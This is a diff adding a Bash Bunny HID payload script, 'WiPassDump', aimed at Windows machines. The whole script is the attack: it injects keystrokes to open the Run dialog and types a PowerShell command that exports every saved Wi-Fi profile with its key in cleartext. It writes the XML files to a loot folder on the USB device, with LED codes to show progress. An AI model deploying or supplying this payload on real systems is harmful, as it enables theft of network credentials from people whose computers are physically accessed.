@@ -1,0 +1,47 @@
+# Title: WiPassDump
+
+# Author: jafahulo -- Cred: samdeg555
+
+# Version: 2.0
+
+# Target: Windows
+
+
+#
+## Runs powershell
+
+## dumps cleartext passwords as .xml files to loot folder
+
+#
+# R Blinking..... Running
+#
+# Green..............Finished
+
+
+
+ATTACKMODE HID STORAGE
+
+# Create directory under loot to store passwords in
+mkdir -p /root/udisk/loot/WiPassDump
+
+LED R 200
+
+Q GUI r
+Q DELAY 1000
+Q STRING powershell \$bunny\=\(gwmi win32_volume -f \'label=\\\"BashBunny\\\"\'\).NAME\; cd \$bunny\\loot\\WiPassDump\; netsh wlan export profile key=clear
+Q ENTER
+
+LED B
+
+Q DELAY 1000;
+#Q STRING cd \$bunny\\loot\\WiPassDump\; netsh wlan export profile key=clear
+#Q ENTER
+#Q DELAY 500
+
+#exit
+#Q STRING exit
+#Q ENTER
+
+sync
+
+LED G
